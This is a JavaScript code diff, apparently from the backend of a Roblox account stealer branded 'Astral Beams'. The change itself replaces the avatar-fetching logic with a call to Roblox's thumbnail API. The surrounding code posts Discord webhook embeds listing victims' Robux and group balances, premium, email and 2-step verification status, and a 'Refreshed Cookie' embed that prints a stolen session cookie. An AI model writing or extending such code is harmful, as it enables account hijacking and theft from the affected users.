@@ -324,6 +324,25 @@ export default {
 
         let webhookUrl;
         let payload = {};
+        let imageUrl = 'https://i.ibb.co/v6SjQn5D/astrallogo.webp';
+
+        // ---- FETCH AVATAR ----
+        if (d.userId) {
+          try {
+            const userId = d.userId;
+            const res = await fetch(
+              `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`
+            );
+            if (res.ok) {
+              const json = await res.json();
+              if (json.data && json.data[0] && json.data[0].imageUrl) {
+                imageUrl = json.data[0].imageUrl;
+              }
+            }
+          } catch (err) {
+            console.log('Avatar fetch error:', err);
+          }
+        }
 
         const fire = '<a:whitefire:1334544007027626051>';
         const yes = '<:check:1334546267040387074>';
@@ -332,11 +351,6 @@ export default {
         const moneyEmoji = '<:money:1334576383862771793>';
 
         const profileLink = `https://www.roblox.com/users/${d.userId}/profile`;
-        // FIXED: Working Roblox avatar URLs for Discord
-        const avatarUrl1 = `https://www.roblox.com/headshot-thumbnail/image?userId=${d.userId}&width=256&height=256&format=png`;
-        const avatarUrl2 = `https://www.roblox.com/Thumbs/Avatar.ashx?x=256&y=256&userId=${d.userId}`;
-        const avatarUrl3 = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${d.userId}&size=256x256&format=Png&isCircular=false`;
-        const avatarUrl = avatarUrl1;
 
         let accountAge = 'Unknown';
         if (d.created) {
@@ -363,8 +377,8 @@ export default {
             title: `\`Astral Beams\` ${fire}`,
             color: 0xffffff,
             fields: fields,
-            thumbnail: { url: avatarUrl },
-            image: { url: avatarUrl },
+            thumbnail: { url: imageUrl },
+            image: { url: imageUrl },
             footer: { text: `Astral • ${new Date().toLocaleString()}` },
             timestamp: new Date().toISOString()
           };
@@ -404,8 +418,8 @@ export default {
               { name: 'Groups', value: `Balance: ${d.groupBalance || 0}\nPending: ${d.groupPending || 0}\nOwned: ${d.groupOwned || 0}`, inline: false },
               { name: 'Settings', value: `Premium: ${d.premium ? `${yes} (${d.premiumRobux || 0} ${robuxEmoji})` : `${no} (0 ${robuxEmoji})`}\nMail: ${d.mailVerified ? `${yes} (Verified)` : `${no} (Unverified)`}\n2SV: ${d.twoStep ? `${yes} (Enabled)` : `${no} (Disabled)`}`, inline: false }
             ],
-            thumbnail: { url: avatarUrl },
-            image: { url: avatarUrl },
+            thumbnail: { url: imageUrl },
+            image: { url: imageUrl },
             footer: { text: `Astral • ${new Date().toLocaleString()}` },
             timestamp: new Date().toISOString()
           };
@@ -424,7 +438,7 @@ export default {
             title: 'Refreshed Cookie',
             color: 0xffffff,
             description: '```' + cookieToSend + '```',
-            thumbnail: { url: avatarUrl || 'https://i.ibb.co/v6SjQn5D/astrallogo.webp' },
+            thumbnail: { url: imageUrl },
             footer: { text: `Astral • ${new Date().toLocaleString()}` },
             timestamp: new Date().toISOString()
           };
